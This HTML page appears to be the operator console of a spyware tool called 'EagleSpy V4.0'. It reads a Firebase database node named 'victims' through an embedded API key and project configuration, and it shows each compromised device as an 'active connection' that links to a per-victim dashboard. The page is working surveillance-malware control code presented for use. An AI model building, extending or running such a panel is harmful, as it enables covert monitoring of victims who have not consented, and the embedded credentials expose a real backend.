<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EAGLESPY - MASTER CONTROL</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --red: #ff0000; --bg: #000; --green: #00ff41; --glass: rgba(15, 0, 0, 0.9); }
        body { background: var(--bg); color: var(--red); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.8; }
        
        .header { border-bottom: 2px solid var(--red); padding: 15px; display: flex; align-items: center; justify-content: center; gap: 15px; background: var(--glass); box-shadow: 0 0 20px red; }
        .header img { width: 50px; filter: drop-shadow(0 0 8px red); animation: pulse 2s infinite; }
        
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }

        .container { padding: 20px; max-width: 800px; margin: auto; }
        .victim-card { 
            background: rgba(30, 0, 0, 0.6); border: 1px solid var(--red); 
            padding: 15px; margin-bottom: 12px; display: flex; 
            justify-content: space-between; align-items: center; cursor: pointer; transition: 0.4s;
            position: relative; overflow: hidden;
        }
        .victim-card:hover { background: var(--red); color: white; box-shadow: 0 0 15px var(--red); }
        .status-on { color: var(--green); font-weight: bold; font-size: 11px; text-shadow: 0 0 5px var(--green); }

        /* Scanning Animation */
        .scan-line { width: 100%; height: 2px; background: var(--red); position: absolute; top: 0; left: 0; animation: scan 3s linear infinite; opacity: 0.5; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body>
    <canvas id="bg-canvas"></canvas>
    <div class="header">
        <img src="https://i.postimg.cc/RCYbwpF3/favicon.png" alt="Logo">
        <div>
            <h2 style="margin:0;">EAGLESPY <span style="color:white">V4.0</span></h2>
            <small style="color:gray;">DARK MASTER CONTROL</small>
        </div>
    </div>
    <div class="container">
        <h3 style="border-left: 4px solid red; padding-left: 10px;">>_ ACTIVE_CONNECTIONS</h3>
        <div id="victims-list">
            <div style="padding:20px; text-align:center;">[ LOADING_ENCRYPTED_NODES... ]</div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyA5-E06ArKA7Unf-fHtCflOEwu2p8VM9kI",
            authDomain: "dark-5b7c9.firebaseapp.com",
            databaseURL: "https://dark-5b7c9-default-rtdb.firebaseio.com",
            projectId: "dark-5b7c9",
            storageBucket: "dark-5b7c9.firebasestorage.app",
            messagingSenderId: "1029612020880",
            appId: "1:1029612020880:web:1d2d6f3ee96af0cf06a415"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Matrix Bg
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        let p = Array(150).fill().map(() => ({x:Math.random()*canvas.width, y:Math.random()*canvas.height, s:Math.random()*2+1}));
        function draw() {
            ctx.clearRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "red";
            p.forEach(s => { s.y += s.s; if(s.y > canvas.height) s.y = 0; ctx.fillRect(s.x, s.y, 2, 2); });
            requestAnimationFrame(draw);
        }
        draw();

        db.ref('victims').on('value', (snap) => {
            const list = document.getElementById('victims-list');
            list.innerHTML = "";
            const data = snap.val();
            if(!data) { list.innerHTML = ">_ WAITING FOR TARGETS..."; return; }
            Object.keys(data).forEach(vId => {
                list.innerHTML += `
                <div class="victim-card" onclick="window.location.href='dashboard.html?id=${vId}'">
                    <div class="scan-line"></div>
                    <div><i class="fa-solid fa-user-secret"></i> <b>${vId}</b></div>
                    <div class="status-on">[ ONLINE_SYNC ]</div>
                </div>`;
            });
        });
    </script>
</body>
</html>
